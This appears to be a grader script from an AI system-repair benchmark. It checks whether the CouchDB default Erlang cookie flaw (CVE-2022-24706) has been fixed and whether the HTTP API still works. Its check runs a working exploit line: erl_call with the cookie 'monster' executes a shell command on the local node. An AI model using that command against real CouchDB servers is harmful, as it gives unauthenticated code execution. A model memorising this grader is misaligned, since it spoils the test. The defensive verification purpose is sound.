#!/bin/bash
# Scenario 42: CouchDB 3.2.1 — Default Erlang Cookie RCE (CVE-2022-24706)
#
# PoC (DYNAMIC exploit against the LIVE Erlang node): use the bundled erl_call
# to connect to the CouchDB distribution node with the default cookie "monster"
# and execute `os:cmd("id")`.  If that returns the couchdb uid, the running node
# still accepts the default cookie => unauthenticated RCE => VULNERABLE.
#
#   config fixed + restarted     -> monster rejected          -> PASS
#   config fixed + NOT restarted -> live node still monster    -> FAIL
#   config not fixed             -> monster accepted           -> FAIL
#
# Regression: CouchDB HTTP API must still be reachable on 5984.
#
# Two-component protocol: every check is recorded with its kind and NOTHING
# aborts early, so "rotated the cookie but killed CouchDB" is reported as
# security_pass / regression_pass rather than a bare exit 1. See lib/verifylib.sh.
set -u
# The guard is load-bearing: under the harness scorer.py has already inlined the
# library and set this, so the agent-writable /tmp path is never read.
[ -n "${_SYSREPAIR_VERIFYLIB_LOADED:-}" ] || . "${SYSREPAIR_VERIFYLIB:-/tmp/verifylib.sh}"

VM_ARGS="/opt/couchdb/etc/vm.args"
ERL_CALL="$(ls /opt/couchdb/erts-*/bin/erl_call 2>/dev/null | head -1 || true)"

###############################################################################
# Wait for the node to be up so the exploit targets a live node (and a slow
# boot is not mistaken for "fixed").
###############################################################################
UP=""
for i in $(seq 1 60); do
    UP=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:5984/_up 2>/dev/null || echo 000)
    [ "$UP" = "200" ] && break
    sleep 2
done
if [ "$UP" = "200" ]; then
    record_reg couchdb_reachable 1
else
    record_reg couchdb_reachable 0 "CouchDB not reachable on 5984 (service down, HTTP $UP)"
fi

# Discover the node name from vm.args (default couchdb@127.0.0.1).
NODE=$(grep -E '^\s*-name\s+' "$VM_ARGS" 2>/dev/null | awk '{print $2}' | head -1 || true)
[ -z "$NODE" ] && NODE="couchdb@127.0.0.1"

###############################################################################
# PoC (DYNAMIC): attempt RCE with the default cookie.
###############################################################################
if [ -n "$ERL_CALL" ] && [ -x "$ERL_CALL" ]; then
    if [ "$UP" = "200" ]; then
        # Connect to the TARGET CouchDB node ($NODE) with -name, presenting our own
        # hidden node name via -h. (-name specifies the node to connect to, not our
        # own identity — an earlier version targeted a non-existent "attacker" node,
        # so the exploit never connected and every baseline read as safe.)
        EXPLOIT=""
        for i in 1 2 3 4 5; do
            EXPLOIT=$(timeout 25 "$ERL_CALL" -c monster -name "$NODE" -h attacker \
                        -a 'os cmd ["id"]' 2>/dev/null || true)
            echo "$EXPLOIT" | grep -q 'uid=' && break
            sleep 2
        done
        if echo "$EXPLOIT" | grep -q 'uid='; then
            record_poc erlang_cookie_not_default 0 \
                "RCE via default cookie 'monster' succeeded on ${NODE} (${EXPLOIT}) — CVE-2022-24706 live"
        else
            record_poc erlang_cookie_not_default 1 "the live Erlang node rejects the default cookie 'monster'"
        fi
    else
        # The node is not serving at all, so a failed erl_call proves nothing
        # about the cookie. Recorded as FAILED, never credited: a dead node
        # rejects the 'monster' cookie too, and that must not read as a rotated
        # cookie. On this path the PoC is the only one recorded, so it cannot be
        # dropped either -- a summary with zero PoC checks carries no security
        # verdict at all.
        record_poc erlang_cookie_not_default 0 \
            "not demonstrable: CouchDB node unreachable, so a failed erl_call proves nothing"
    fi
else
    # Fallback: erl_call unavailable in this image build — fall back to a config
    # check and flag the reduced assurance.  (erl_call ships under
    # /opt/couchdb/erts-*/bin in stock images, so this path is not expected.)
    echo "WARN [PoC]: erl_call not found; falling back to vm.args config check (reduced assurance)." >&2
    if grep -qE '^\s*-setcookie\s+monster\s*$' "$VM_ARGS" 2>/dev/null; then
        record_poc erlang_cookie_not_default 0 "vm.args still contains the default cookie 'monster'"
    elif ! grep -qE '^\s*-setcookie\s+\S+' "$VM_ARGS" 2>/dev/null; then
        record_poc erlang_cookie_not_default 0 "vm.args has no -setcookie entry — Erlang distribution unsecured"
    else
        record_poc erlang_cookie_not_default 1 "default cookie replaced (config check)"
    fi
fi

###############################################################################
# Regression: HTTP API still reachable.
###############################################################################
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:5984/_up 2>/dev/null || echo 000)
if [ "$HTTP_CODE" = "200" ]; then
    record_reg couchdb_http_api 1 "CouchDB HTTP API reachable on 5984"
else
    record_reg couchdb_http_api 0 "CouchDB not reachable on 5984 (HTTP $HTTP_CODE)"
fi

verify_finish
